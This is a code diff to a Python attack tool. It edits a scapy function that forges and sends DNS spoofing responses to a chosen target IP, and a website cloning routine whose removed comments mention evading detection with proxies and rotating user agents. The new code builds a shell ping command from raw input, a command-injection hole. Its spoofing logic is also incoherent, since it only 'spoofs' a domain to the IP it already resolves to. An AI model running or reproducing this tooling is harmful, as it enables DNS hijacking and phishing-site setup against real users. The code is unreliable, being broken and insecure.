@@ -1,11 +1,10 @@
-from scapy.all import *
 import os
-import shutil
-import subprocess
-import requests
 import re
-import time
 import socket
+import subprocess
+import time
+from scapy.all import *
+import requests
 
 def clear_screen():
     """Clear the terminal screen."""
@@ -79,22 +78,33 @@ def perform_dns_spoofing(dns_server_ip):
     print("[+] Performing DNS Spoofing Attack...")
     target_ip = input("Enter the target IP address: ")
     target_domain = input("Enter the target domain to spoof: ")
-    
-    # Get the IP address to spoof
-    spoofed_ip = get_ip_address(target_domain)
-    if spoofed_ip is None:
-        return
-    
-    print(f"The IP address to spoof for {target_domain} is {spoofed_ip}")
 
-    # Craft DNS response packet with spoofed IP
+    # Additional steps:
+    # 1. Check if the target IP address is reachable
+    response = os.system("ping -c 1 " + target_ip)
+    if response == 0:
+        print(f"[+] Target IP {target_ip} is reachable.")
+    else:
+        print(f"[-] Target IP {target_ip} is not reachable. Exiting...")
+        return
+
+    # 2. Validate the target domain's IP address
+    try:
+        resolved_ip = socket.gethostbyname(target_domain)
+        if resolved_ip != target_ip:
+            print(f"[-] Target IP {target_ip} does not match the resolved IP {resolved_ip} for the domain {target_domain}. Exiting...")
+            return
+    except socket.gaierror:
+        print("[-] Error: Unable to resolve the target domain. Exiting...")
+        return
+
+    # 3. Start spoofing only if validation passes
+    print(f"The IP address to spoof for {target_domain} is {target_ip}")
     spoofed_pkt = IP(dst=target_ip) / UDP(dport=53) / DNS(
         qr=1,
         id=42,
-        an=DNSRR(rrname=target_domain, ttl=10, rdata=spoofed_ip)
+        an=DNSRR(rrname=target_domain, ttl=10, rdata=target_ip)
     )
-
-    # Send the spoofed DNS response
     send(spoofed_pkt, verbose=False)
 
     print("[+] DNS spoofing attack completed successfully.")
@@ -125,17 +135,29 @@ def website_cloning_menu():
 def clone_website(clone_type):
     """Clone the website."""
     print("[+] Cloning Website...")
-    # Additional steps:
-    # 1. Use tools like wget, HTTrack, or web scraping libraries to download website content
-    # 2. Handle dynamic content and complex site structures in advanced cloning
-    # 3. Avoid detection by using proxies, rotating user agents, or modifying request headers
     if clone_type == "simple":
         print("[+] Cloning website with basic techniques...")
     elif clone_type == "advanced":
         print("[+] Cloning website with advanced techniques...")
-    # 4. Prompt the user for the URL of the website to clone
+
     website_url = input("Enter the URL of the website to clone: ")
-    # 5. Prompt the user to choose the output directory
+
+    # Additional steps:
+    # 1. Check if the URL is valid
+    if not re.match(r"^https?://", website_url):
+        print("[-] Invalid URL. Please enter a valid URL starting with 'http://' or 'https://'. Exiting...")
+        return
+
+    # 2. Validate the website URL
+    try:
+        response = requests.get(website_url)
+        if response.status_code != 200:
+            print(f"[-] Error: Unable to access website at {website_url}. Exiting...")
+            return
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error: {e}. Exiting...")
+        return
+
     print("Choose where to save the cloned website:")
     print("01. /path/to/directory1")
     print("02. /path/to/directory2")
@@ -155,22 +177,25 @@ def clone_website(clone_type):
         print("Invalid choice. Defaulting to desktop directory.")
         output_directory = os.path.expanduser("~/Desktop")
 
-    # 6. Save the cloned website to the specified output directory
     save_cloned_website(website_url, output_directory)
 
 def save_cloned_website(website_url, output_dir):
     """Save the cloned website to the specified output directory."""
     try:
-        # Create the output directory if it doesn't exist
         if not os.path.exists(output_dir):
             os.makedirs(output_dir)
 
-        # Use wget to clone the website
-        subprocess.run(["wget", "--recursive", "--no-clobber", "--page-requisites", "--html-extension", "--convert-links", "--restrict-file-names=windows", "--domains", website_url, "--no-parent", website_url, "-P", output_dir])
+        # 3. Download the website content using requests
+        response = requests.get(website_url)
+        if response.status_code == 200:
+            with open(os.path.join(output_dir, "index.html"), "wb") as f:
+                f.write(response.content)
+            print("[+] Website cloned successfully.")
+        else:
+            print(f"[-] Error: Unable to download website content from {website_url}. Exiting...")
+            return
 
-        print("[+] Website cloned successfully.")
-
-        # Create a text file to indicate successful cloning
+        # 4. Create a text file to indicate successful cloning
         with open(os.path.join(output_dir, "cloned_website.txt"), "w") as f:
             f.write(f"The website {website_url} was successfully cloned.")
 
